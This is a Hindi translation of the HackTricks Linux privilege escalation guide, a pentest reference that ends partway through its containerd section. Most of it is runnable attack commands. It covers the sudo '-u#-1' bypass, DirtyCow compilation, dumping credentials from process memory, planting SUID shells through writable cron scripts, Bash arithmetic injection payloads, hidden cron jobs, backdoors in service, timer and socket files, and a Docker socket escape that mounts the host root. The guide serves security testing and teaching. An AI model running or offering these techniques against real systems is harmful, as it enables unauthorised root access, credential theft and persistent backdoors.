# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी हासिल करना शुरू करें।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` वैरिएबल के किसी भी फ़ोल्डर पर लिखने की अनुमति** रखते हैं, तो आप कुछ लाइब्रेरीज़ या बाइनरीज़ को हाईजैक कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई दिलचस्प जानकारी, पासवर्ड या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version की जाँच करें और देखें कि कोई exploit है जिसे escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel list और कुछ पहले से **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले टूल:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Always **Google में kernel version खोजें**, हो सकता है आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो सकेंगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो प्रकट होते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके यह जांच सकते हैं कि sudo का संस्करण कमजोर है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

द्वारा @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** — इस vuln का शोषण कैसे किया जा सकता है, इसका **उदाहरण**।
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा उपायों की सूची

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

अगर आप किसी docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## Drives

जाँचें कि **क्या mounted और unmounted है**, कहाँ और क्यों। अगर कुछ भी unmounted है तो आप इसे mount करने की कोशिश कर सकते हैं और निजी जानकारी के लिए जाँच कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही, जाँच करें कि **any compiler is installed**। यह तब उपयोगी होता है जब आपको कोई kernel exploit चलाना हो, क्योंकि अनुशंसा की जाती है कि इसे उसी machine पर compile करें जहाँ आप इसे चलाने वाले हैं (या किसी समान machine में)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### असुरक्षित इंस्टॉल किए गए सॉफ़्टवेयर

इंस्टॉल किए गए पैकेजों और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जो escalating privileges के लिए exploited किया जा सके…\  
अनुशंसा की जाती है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअली जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH access है, तो आप मशीन के अंदर इंस्टॉल किए गए outdated और vulnerable software की जाँच करने के लिए **openVAS** का उपयोग भी कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगे जो ज्यादातर बेकार होगी, इसलिए OpenVAS या इसी तरह के कुछ applications का उपयोग करने की सलाह दी जाती है जो जाँच करें कि कोई इंस्टॉल किए गए software version ज्ञात exploits के लिए vulnerable तो नहीं है_

## प्रक्रियाएँ

देखें कि **कौन सी प्रक्रियाएँ** चल रही हैं और जाँचें कि कोई प्रक्रिया **उससे अधिक privileges तो नहीं रखती जितनी उसे होनी चाहिए** (शायद कोई tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा यह जाँचें कि कोई [**electron/cef/chromium debuggers** चल तो नहीं रहे हैं, आप इन्हें privileges escalate करने के लिए abuse कर सकते हैं](electron-cef-chromium-debugger-abuse.md). **Linpeas** इनको process की command line में `--inspect` parameter की जाँच करके पहचानता है.\
साथ ही **process के binaries पर अपनी privileges जाँचें**, शायद आप किसी को overwrite कर सकें।

### प्रोसेस मॉनिटरिंग

आप प्रोसेस मॉनिटर करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह अक्सर चलने वाले या जब कुछ शर्तें पूरी हों तो vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है।

### प्रोसेस मेमोरी

किसी सर्वर की कुछ सेवाएँ **memory के अंदर clear text में credentials** स्टोर करती हैं।\
सामान्यतः अन्य users के processes की memory पढ़ने के लिए आपको **root privileges** चाहिए होते हैं, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से ही root हों और और credentials खोजना चाहें।\
हालांकि, याद रखें कि **एक regular user के रूप में आप उन processes की memory पढ़ सकते हैं जो आपके हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश मशीनें **default रूप से ptrace की अनुमति नहीं देतीं** जिसका मतलब है कि आप उन other processes को dump नहीं कर सकते जो आपके unprivileged user से संबंधित हैं।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनकी वही uid हो। यह ptracing का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: ptrace के साथ कोई भी process trace नहीं किया जा सकता। एक बार सेट होने पर ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service (उदाहरण के लिए) की memory तक पहुँच है, तो आप Heap निकाल कर उसके credentials के अंदर search कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाते हैं कि उस process के virtual address space में memory कैसे मैप हुई है**; यह प्रत्येक मैप किए गए region की **permissions** भी दिखाता है। वहीं, **mem** pseudo file **प्रोसेस की मेमोरी को स्वयं उजागर करता है**। **maps** फ़ाइल से हमें पता चलता है कि कौन से **memory regions पढ़ने योग्य हैं** और उनके offsets। हम इस जानकारी का उपयोग करके **mem file में seek कर के सभी पढ़ने योग्य regions को dump करके** एक फ़ाइल में सेव करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच देता है, न कि वर्चुअल मेमोरी। कर्नेल के वर्चुअल एड्रेस स्पेस तक /dev/kmem का उपयोग करके पहुँचा जा सकता है.\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ने योग्य होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के लिए Sysinternals suite के क्लासिक ProcDump टूल की Linux में पुनर्कल्पना है। इसे यहाँ प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताएँ हटा कर अपने स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root की आवश्यकता है)

### प्रोसेस मेमोरी से क्रेडेंशियल्स

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शनों को देखें ताकि किसी process की memory को dump करने के विभिन्न तरीके मिल सकें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **मेमोरी से क्लियर‑टेक्स्ट क्रेडेंशियल्स चुराएगा** और कुछ **प्रसिद्ध फ़ाइलों** से भी। यह सही तरीके से काम करने के लिए root privileges की आवश्यकता रखता है।

| विशेषता                                           | प्रोसेस का नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

जाँच करें कि कोई scheduled job vulnerable है या नहीं। शायद आप उस script का फायदा उठा सकते हैं जो root द्वारा execute की जाती है (wildcard vuln? क्या आप root द्वारा उपयोग की जाने वाली files को modify कर सकते हैं? symlinks का उपयोग? root द्वारा उपयोग किए जा रहे directory में specific files बना सकते हैं?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root उपयोगकर्ता PATH सेट किए बिना किसी कमांड या स्क्रिप्ट को निष्पादित करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
फिर, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron: वाइल्डकार्ड के साथ स्क्रिप्ट (Wildcard Injection)

यदि कोई स्क्रिप्ट root द्वारा execute की जा रही है और किसी command के अंदर “**\***” मौजूद है, तो आप इसे exploit करके अप्रत्याशित चीजें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **के पहले आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash parameter expansion और command substitution को ((...)), $((...)) और let में arithmetic evaluation से पहले करता है। यदि कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में डालता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron के चलने पर root के रूप में execute होगा।

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled टेक्स्ट लिखवाएँ ताकि numeric-looking field में command substitution हो और वह किसी digit पर समाप्त हो। सुनिश्चित करें कि आपका command stdout पर कुछ न छापे (या इसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
अगर root द्वारा चलाया गया script किसी ऐसी **directory जहाँ आपको पूर्ण पहुँच हो** का उपयोग करता है, तो उस फ़ोल्डर को हटाकर और आपकी नियंत्रित script परोसे जाने वाले किसी अन्य स्थान की ओर एक **symlink फ़ोल्डर बनाने** से यह उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### बार-बार चलने वाले cron jobs

आप प्रोसेसों की निगरानी कर सकते हैं ताकि उन प्रोसेसों को ढूँढा जा सके जो हर 1, 2 या 5 मिनट में चल रहे हों। शायद आप इसका फायदा उठा कर escalate privileges कर सकें।

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1s पर मॉनिटर करने**, **कम चलाए गए कमांड के अनुसार सॉर्ट करने** और उन कमांड्स को हटाने के लिए जो सबसे ज़्यादा चल चुके हैं, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका उपयोग भी कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली हर process की निगरानी करेगा और उन्हें सूचीबद्ध करेगा)।

### अदृश्य cron jobs

एक cronjob बनाया जा सकता है **comment के बाद एक carriage return डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** (maybe you will need to wait until the machine is rebooted).\
For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Keep in mind that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.

### systemd PATH - Relative Paths

You can see the PATH used by **systemd** with:
```bash
systemctl show-environment
```
यदि आप पथ के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप **escalate privileges** कर सकते हैं। आपको **relative paths being used on service configurations** जैसी फ़ाइलों में तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिसे आप लिख सकते हैं, उसी नाम का एक **executable** बनाएं जैसा कि relative path binary का है, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, आपका **backdoor** executed होगा (unprivileged users आमतौर पर सेवाएँ start/stop नहीं कर सकते, पर जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में और जानने के लिए `man systemd.service` देखें।**

## **टाइमर**

**टाइमर** systemd unit files होते हैं जिनके नाम का अंत `**.timer**` में होता है और ये `**.service**` फ़ाइलों या इवेंट्स को नियंत्रित करते हैं। **टाइमर** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी टाइमर को निम्नलिखित से enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य timers

यदि आप किसी timer को संशोधित कर सकते हैं तो आप इसे मौजूद systemd.unit इकाइयों को execute करने के लिए बना सकते हैं (जैसे `.service` या `.target`)
```bash
Unit=backdoor.service
```
> यह वह unit है जिसे इस timer के समाप्त होने पर सक्रिय किया जाता है। आर्गुमेंट एक unit नाम है जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान डिफ़ॉल्ट रूप से उस service को बताता है जिसका नाम timer unit के समान होता है, केवल suffix अलग होता है। (ऊपर देखें।) यह अनुशंसित है कि सक्रिय किए जाने वाले unit का नाम और timer unit का नाम suffix को छोड़कर समान हों।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको निम्न करना होगा:

- किसी systemd unit (जैसे कि `.service`) को खोजें जो **लिखने योग्य बाइनरी को निष्पादित कर रहा हो**
- किसी systemd unit को खोजें जो **relative path को निष्पादित कर रहा हो** और आपके पास **systemd PATH** पर **लिखने के अधिकार** हों (ताकि आप उस executable की नक़ल कर सकें)

**timers के बारे में अधिक जानने के लिए `man systemd.timer` देखें।**

### **टाइमर सक्षम करना**

एक timer को enable करने के लिए आपको root privileges चाहिए और निम्नलिखित चलाना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर इसका symlink बनाकर **सक्रिय** किया जाता है

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल में एक ही या अलग मशीनों पर **प्रक्रिया संचार (process communication)** सक्षम करते हैं। ये कंप्यूटरों के बीच संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` files के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` files के उपयोग से कॉन्फ़िगर किया जा सकता है।

**Sockets के बारे में अधिक जानने के लिए `man systemd.socket` देखें।** इस फ़ाइल के अंदर कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग हैं लेकिन सारांश के रूप में उपयोग होता है यह **बताने के लिए कि कहाँ यह socket को सुनने वाला है** (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने के लिए port नंबर, आदि)।
- `Accept`: boolean argument लेता है। यदि **true**, तो प्रत्येक इनकमिंग कनेक्शन के लिए एक **service instance बनाई जाती है** और केवल कनेक्शन socket ही उसे पास किया जाता है। यदि **false**, तो सभी listening sockets स्वयं **started service unit को पास किए जाते हैं**, और सभी कनेक्शनों के लिए केवल एक service unit ही बनाई जाती है। यह मान datagram sockets और FIFOs के लिए अनदेखा कर दिया जाता है जहाँ एक ही service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को संभालता है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons केवल `Accept=no` के अनुरूप ही लिखने की सलाह दी जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जो क्रमशः listening **sockets**/FIFOs के **बनाए जाने** और बाइंड होने से पहले या बाद में **निष्पादित** होते हैं। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो क्रमशः listening **sockets**/FIFOs के **बंद** और हटाए जाने से पहले या बाद में निष्पादित होते हैं।
- `Service`: incoming traffic पर सक्रिय करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल उन sockets के लिए अनुमति है जिनके लिए Accept=no है। यह डिफ़ॉल्ट रूप से उस service को चुनेगा जिसका नाम socket के समान होता है (सफलिक्स बदलकर)। अधिकांश मामलों में इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप कोई **लिखने योग्य** `.socket` file पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket के बनाए जाने से पहले निष्पादित हो जाएगा। इसलिए, आपको **शायद मशीन के reboot होने तक इंतज़ार करना पड़ेगा।**\
_ध्यान दें कि सिस्टम को उस socket file configuration का उपयोग करना चाहिए वरना backdoor निष्पादित नहीं होगा_

### Writable sockets

यदि आप कोई भी writable socket पहचानते हैं (अब हम Unix Sockets की बात कर रहे हैं न कि config `.socket` files), तो आप उस socket के साथ संवाद कर सकते हैं और शायद किसी vulnerability को exploit कर सकेंगे।

### Unix Sockets को सूचीबद्ध करें
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests मौजूद हो सकते हैं (_यहाँ मेरा तात्पर्य .socket फ़ाइलों से नहीं है, बल्कि उन फ़ाइलों से है जो unix sockets के रूप में कार्य करती हैं।_). आप इसे निम्न से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद कुछ **exploit some vulnerability** भी कर पाएँ।

### Writable Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों द्वारा writable होता है. इस socket पर write access होना privilege escalation का कारण बन सकता है. यहाँ बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके क्या हैं यदि Docker CLI उपलब्ध नहीं है।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्न commands का उपयोग करके escalate privileges कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को Docker API और `curl` commands का उपयोग करके अभी भी हेरफेर किया जा सकता है।

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`sudo` `socat` कनेक्शन सेट करने के बाद, आप container के अंदर सीधे कमांड चला सकते हैं जिनके पास host की filesystem पर root-level पहुंच होती है।

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

जाँचें **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** command का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
